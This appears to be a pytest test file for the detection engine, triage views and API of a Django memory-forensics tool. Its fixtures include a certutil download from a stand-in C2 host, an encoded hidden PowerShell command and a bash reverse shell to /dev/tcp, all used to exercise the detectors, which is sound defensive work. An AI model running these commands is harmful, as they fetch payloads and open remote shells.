import json

import pytest
from django.urls import reverse
from guardian.shortcuts import assign_perm

from orochi.website.defaults import RESULT_STATUS_SUCCESS
from orochi.website.detection.engine import evaluate_dump_triage
from orochi.website.detection.rules import (
    evaluate_code_injection,
    evaluate_dkom_unlinked,
    evaluate_linux_threats,
    evaluate_parent_child_incoherence,
    evaluate_process_masquerading,
    evaluate_suspicious_cmdlines,
    evaluate_suspicious_network,
)
from orochi.website.models import Case, Finding, Plugin, Result, TriageFinding, Value

pytestmark = pytest.mark.django_db


# Helper to insert plugin Values
def create_plugin_values(dump, plugin_name, values):
    plugin, _ = Plugin.objects.get_or_create(
        name=plugin_name,
        defaults={"operating_system": dump.operating_system or "Windows"},
    )
    result = Result.objects.create(
        dump=dump,
        plugin=plugin,
        result=RESULT_STATUS_SUCCESS,
    )
    created = []
    for v in values:
        created.append(Value.objects.create(result=result, value=v))
    return created


# =====================================================================
# 1. Forensic Rule Evaluator Unit Tests
# =====================================================================
def test_evaluate_parent_child_incoherence():
    """Test svchost.exe parent incoherence detection."""
    pslist_rows = [
        {"PID": 100, "PPID": 4, "ImageFileName": "services.exe"},
        {"PID": 101, "PPID": 100, "ImageFileName": "svchost.exe"},  # Normal svchost
        {"PID": 200, "PPID": 500, "ImageFileName": "cmd.exe"},
        {
            "PID": 201,
            "PPID": 200,
            "ImageFileName": "svchost.exe",
        },  # Rogue svchost spawned by cmd.exe!
    ]

    findings = evaluate_parent_child_incoherence(pslist_rows)
    assert len(findings) == 1
    f = findings[0]
    assert f.rule_id == "PROC_INCOHERENT_PARENT_SVCHOST"
    assert f.severity == "Critical"
    assert "svchost.exe" in f.entity
    assert "PID 201" in f.evidence_snippet
    assert "cmd.exe" in f.evidence_snippet


def test_evaluate_process_masquerading():
    """Test process masquerading and typo-squatting."""
    rows = [
        {
            "PID": 300,
            "ImageFileName": "scvhost.exe",
            "Path": "C:\\Windows\\System32\\scvhost.exe",
        },  # Typosquat
        {
            "PID": 400,
            "ImageFileName": "lsass.exe",
            "Path": "C:\\Users\\victim\\AppData\\lsass.exe",
        },  # Masquerade path
        {
            "PID": 500,
            "ImageFileName": "explorer.exe",
            "Path": "C:\\Windows\\explorer.exe",
        },  # Clean
    ]
    cmdlines = [
        {"PID": 400, "Args": "C:\\Users\\victim\\AppData\\lsass.exe"},
    ]

    findings = evaluate_process_masquerading(rows, cmdlines)
    assert len(findings) == 2
    rule_ids = [f.rule_id for f in findings]
    assert "PROC_TYPOSQUAT_MASQUERADE" in rule_ids
    assert "PROC_SUSPICIOUS_PATH" in rule_ids


def test_evaluate_dkom_unlinked():
    """Test DKOM hidden process detection unlinked from pslist."""
    pslist_rows = [{"PID": 100, "ImageFileName": "services.exe", "Offset": "0x1000"}]
    psscan_rows = [
        {"PID": 100, "ImageFileName": "services.exe", "Offset": "0x1000"},
        {
            "PID": 666,
            "ImageFileName": "stealth_rootkit.exe",
            "Offset": "0x9000",
        },  # Hidden from pslist
    ]

    findings = evaluate_dkom_unlinked(pslist_rows, psscan_rows)
    assert len(findings) == 1
    assert findings[0].rule_id == "STEALTH_DKOM_UNLINKED"
    assert findings[0].severity == "Critical"
    assert "stealth_rootkit.exe" in findings[0].entity
    assert "666" in findings[0].evidence_snippet


def test_evaluate_suspicious_cmdlines():
    """Test LOLBin abuse and encoded powershell."""
    rows = [
        {
            "PID": 101,
            "Process": "powershell.exe",
            "CommandLine": "powershell.exe -noni -w hidden -enc SQBFAFgA...",
        },
        {
            "PID": 102,
            "Process": "certutil.exe",
            "CommandLine": "certutil.exe -urlcache -split -f http://c2.evil.com/payload.exe payload.exe",
        },
        {
            "PID": 103,
            "Process": "notepad.exe",
            "CommandLine": "notepad.exe document.txt",
        },
    ]

    findings = evaluate_suspicious_cmdlines(rows)
    assert len(findings) == 2
    rule_ids = [f.rule_id for f in findings]
    assert "CMD_POWERSHELL_OBFUSCATED" in rule_ids
    assert "CMD_LOLBIN_EXECUTION" in rule_ids


def test_evaluate_suspicious_network():
    """Test suspicious sockets and C2 network ports."""
    rows = [
        {
            "PID": 700,
            "Process": "notepad.exe",
            "ForeignAddr": "198.51.100.1",
            "ForeignPort": 80,
        },  # Non-network binary
        {
            "PID": 701,
            "Process": "svchost.exe",
            "ForeignAddr": "203.0.113.5",
            "ForeignPort": 4444,
        },  # C2 Metasploit port
        {
            "PID": 702,
            "Process": "chrome.exe",
            "ForeignAddr": "142.250.190.46",
            "ForeignPort": 443,
        },  # Legitimate web traffic
    ]

    findings = evaluate_suspicious_network(rows)
    assert len(findings) == 2
    rule_ids = [f.rule_id for f in findings]
    assert "NET_INCONGRUOUS_PROCESS" in rule_ids
    assert "NET_SUSPICIOUS_C2_PORT" in rule_ids


def test_evaluate_code_injection():
    """Test malfind RWX code injection evaluation for Windows (MZ) and Linux (ELF)."""
    rows = [
        {
            "PID": 800,
            "Process": "explorer.exe",
            "Protection": "PAGE_EXECUTE_READWRITE",
            "CommitCharge": 1,
            "Hexdump": "4d 5a 90 00 03 00 00 00",  # MZ executable in injected memory
        },
        {
            "PID": 802,
            "Process": "sshd",
            "Protection": "rwxp",
            "CommitCharge": 1,
            "Hexdump": "7f 45 4c 46 02 01 01 00",  # ELF executable in injected memory
        },
        {
            "PID": 801,
            "Process": "clean.exe",
            "Protection": "PAGE_READONLY",
            "CommitCharge": 0,
            "Hexdump": "00 00 00 00",
        },
    ]

    findings = evaluate_code_injection(rows)
    assert len(findings) == 2
    assert findings[0].rule_id == "INJ_MALFIND_EXEC_REGION"
    assert findings[0].score == 40
    assert "PE / MZ" in findings[0].description
    assert findings[1].rule_id == "INJ_MALFIND_EXEC_REGION"
    assert findings[1].score == 40
    assert "ELF" in findings[1].description


def test_evaluate_linux_threats():
    """Test Linux check_syscall rootkit hook and bash reverse shell."""
    check_rows = [
        {
            "Table": "sys_call_table",
            "Index": 59,
            "Symbol": "sys_execve",
            "Hooked": True,
            "Address": "0xffffffffa0001000",
        },
    ]
    bash_rows = [
        {
            "PID": 900,
            "Process": "bash",
            "Command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        },
    ]

    findings = evaluate_linux_threats(check_rows, bash_rows)
    assert len(findings) == 2
    rule_ids = [f.rule_id for f in findings]
    assert "LINUX_HOOKED_SYSCALL" in rule_ids
    assert "LINUX_BASH_ANOMALY" in rule_ids


# =====================================================================
# 2. Full Engine & Risk Scoring Orchestration
# =====================================================================
def test_evaluate_dump_triage_orchestration(admin, dump):
    """Test full engine run, database persistence of findings, and risk score calculation."""
    assign_perm("website.can_see", admin, dump)

    # Insert malicious activity across multiple plugins
    create_plugin_values(
        dump,
        "windows.pslist.PsList",
        [
            {"PID": 100, "PPID": 200, "ImageFileName": "cmd.exe"},
            {
                "PID": 101,
                "PPID": 100,
                "ImageFileName": "svchost.exe",
            },  # Critical (30 pts)
        ],
    )
    create_plugin_values(
        dump,
        "windows.cmdline.CmdLine",
        [
            {
                "PID": 100,
                "Process": "cmd.exe",
                "CommandLine": "powershell.exe -enc AAAA",
            },  # High (20 pts)
        ],
    )
    create_plugin_values(
        dump,
        "windows.malfind.Malfind",
        [
            {
                "PID": 101,
                "Process": "svchost.exe",
                "Protection": "PAGE_EXECUTE_READWRITE",
                "Hexdump": "4d 5a",
            },  # Critical (30 pts)
        ],
    )

    report = evaluate_dump_triage(dump)
    assert report["dump_name"] == dump.name
    assert report["total_findings"] >= 3
    assert report["risk_score"] >= 75  # 30 + 20 + 30 = 80 >= 75 -> Critical
    assert report["risk_level"] == "Critical"
    assert any("T1055" in t for t in report["mitre_techniques"])

    # Verify persisted in database
    dump.refresh_from_db()
    assert dump.risk_score == report["risk_score"]
    assert dump.triage_findings.count() >= 3


# =====================================================================
# 3. UI Views & Case Finding Promotion
# =====================================================================
def test_dump_triage_view_and_promotion(client, admin, dump):
    """Test GET triage dashboard, promotion to case finding, and POST re-evaluation."""
    client.force_login(admin)
    assign_perm("website.can_see", admin, dump)

    # Seed a triage finding
    dump.risk_score = 65
    dump.save()
    tf = TriageFinding.objects.create(
        dump=dump,
        rule_id="CRIT_PCHILD_01",
        rule_name="Abnormal Parent for svchost.exe",
        category="parent_child_incoherence",
        severity="Critical",
        score=30,
        mitre_technique="T1055",
        description="svchost.exe spawned by cmd.exe",
        evidence_snippet="PID 101 PPID 100",
        entity="svchost.exe (PID 101)",
    )

    triage_url = reverse("website:dump_triage", kwargs={"index": dump.index})

    # 1. GET Triage View
    res_get = client.get(triage_url)
    assert res_get.status_code == 200
    content = res_get.content.decode()
    assert "Forensic Triage & Behavioral Risk" in content
    assert "High Risk" in content  # 65 is High
    assert "Abnormal Parent for svchost.exe" in content

    # 2. Promote Triage Finding to Case Finding
    case = Case.objects.create(name="Triage-Investigation", user=admin)
    promote_url = reverse("website:promote_to_finding")

    res_promote_get = client.get(f"{promote_url}?type=triage&id={tf.id}")
    assert res_promote_get.status_code == 200
    assert "Triage-Investigation" in res_promote_get.content.decode()

    res_promote_post = client.post(
        promote_url,
        {
            "item_type": "triage",
            "item_id": tf.id,
            "case_id": case.id,
            "severity": "Critical",
            "mitre_technique": "T1055",
            "tags": "triage, malfind, injection",
            "note": "Critical process injection observed on svchost",
        },
    )
    assert res_promote_post.status_code == 200
    assert "Promoted to Case Finding" in res_promote_post.content.decode()

    finding = Finding.objects.filter(case=case).first()
    assert finding is not None
    assert finding.severity == "Critical"
    assert finding.mitre_attack_technique == "T1055"
    assert "injection" in finding.tags
    assert finding.evidence is not None
    assert finding.evidence.plugin == "parent_child_incoherence"

    # 3. POST Re-evaluate
    res_post = client.post(triage_url)
    assert res_post.status_code == 200
    assert "Forensic Triage & Behavioral Risk" in res_post.content.decode()


# =====================================================================
# 4. REST API Triage Endpoints
# =====================================================================
def test_api_dump_triage(client, admin, dump):
    """Test REST API GET & POST triage endpoints."""
    client.force_login(admin)
    assign_perm("website.can_see", admin, dump)

    dump.risk_score = 55
    dump.save()
    tf = TriageFinding.objects.create(
        dump=dump,
        rule_id="MASQ_01",
        rule_name="Process Typosquatting",
        category="process_masquerading",
        severity="High",
        score=20,
        mitre_technique="T1036.005",
        description="scvhost.exe masquerading as svchost",
        evidence_snippet="scvhost.exe PID 555",
        entity="scvhost.exe",
    )

    # 1. GET /api/dumps/{index}/triage
    res_get = client.get(f"/api/dumps/{dump.index}/triage")
    assert res_get.status_code == 200
    data = res_get.json()
    assert data["dump_index"] == str(dump.index)
    assert data["risk_score"] == 55
    assert data["risk_level"] == "High"
    assert len(data["findings"]) == 1
    assert data["findings"][0]["rule_id"] == "MASQ_01"

    # 2. POST /api/dumps/promote_finding
    case = Case.objects.create(name="API Triage Case", user=admin)
    promote_res = client.post(
        "/api/dumps/promote_finding",
        data=json.dumps(
            {
                "case_id": case.id,
                "item_type": "triage",
                "item_id": tf.id,
                "severity": "High",
                "mitre_technique": "T1036.005",
                "tags": ["masquerade"],
            }
        ),
        content_type="application/json",
    )
    assert promote_res.status_code == 201
    assert Finding.objects.filter(case=case, mitre_attack_technique="T1036.005").exists()


def test_dump_triage_direct_and_htmx_view(client, admin, dump):
    """Verify that dump_triage properly renders a full standalone page on direct access, and partial in modal."""
    client.force_login(admin)
    assign_perm("website.can_see", admin, dump)
    url = reverse("website:dump_triage", kwargs={"index": dump.index})

    # Direct browser request (not HTMX)
    res_direct = client.get(url)
    assert res_direct.status_code == 200
    content_direct = res_direct.content.decode()
    assert "<!DOCTYPE html>" in content_direct
    assert "<title>Forensic Triage & Behavioral Risk" in content_direct
    assert "Workbench" in content_direct
    assert "Forensic Triage" in content_direct
    assert "dump-triage-container" in content_direct

    # HTMX request (inside modal)
    res_htmx = client.get(url, HTTP_HX_REQUEST="true")
    assert res_htmx.status_code == 200
    content_htmx = res_htmx.content.decode()
    assert "<!DOCTYPE html>" not in content_htmx
    assert "Forensic Triage & Behavioral Risk" in content_htmx
    assert "Assessed Risk" in content_htmx


def test_dump_secrets_direct_and_htmx_view(client, admin, dump):
    """Verify that dump_secrets renders standalone base page on direct access, and partial in modal."""
    client.force_login(admin)
    assign_perm("website.can_see", admin, dump)
    url = reverse("website:dump_secrets", kwargs={"index": dump.index})

    # Direct browser request
    res_direct = client.get(url)
    assert res_direct.status_code == 200
    content_direct = res_direct.content.decode()
    assert "<!DOCTYPE html>" in content_direct
    assert "<title>Secrets & Credentials Hub" in content_direct
    assert "Workbench" in content_direct
    assert "dump-secrets-container" in content_direct

    # HTMX request
    res_htmx = client.get(url, HTTP_HX_REQUEST="true")
    assert res_htmx.status_code == 200
    content_htmx = res_htmx.content.decode()
    assert "<!DOCTYPE html>" not in content_htmx
    assert "Secrets & Credentials Hub" in content_htmx


def test_dump_narrative_direct_and_htmx_view(client, admin, dump):
    """Verify that dump_narrative renders standalone base page on direct access, and partial in modal."""
    client.force_login(admin)
    assign_perm("website.can_see", admin, dump)
    url = reverse("website:dump_narrative", kwargs={"index": dump.index})

    # Direct browser request
    res_direct = client.get(url)
    assert res_direct.status_code == 200
    content_direct = res_direct.content.decode()
    assert "<!DOCTYPE html>" in content_direct
    assert "<title>AI Forensic Triage Narrative" in content_direct
    assert "Workbench" in content_direct
    assert "dump-narrative-container" in content_direct

    # HTMX request
    res_htmx = client.get(url, HTTP_HX_REQUEST="true")
    assert res_htmx.status_code == 200
    content_htmx = res_htmx.content.decode()
    assert "<!DOCTYPE html>" not in content_htmx
    assert "AI Forensic Triage Narrative" in content_htmx
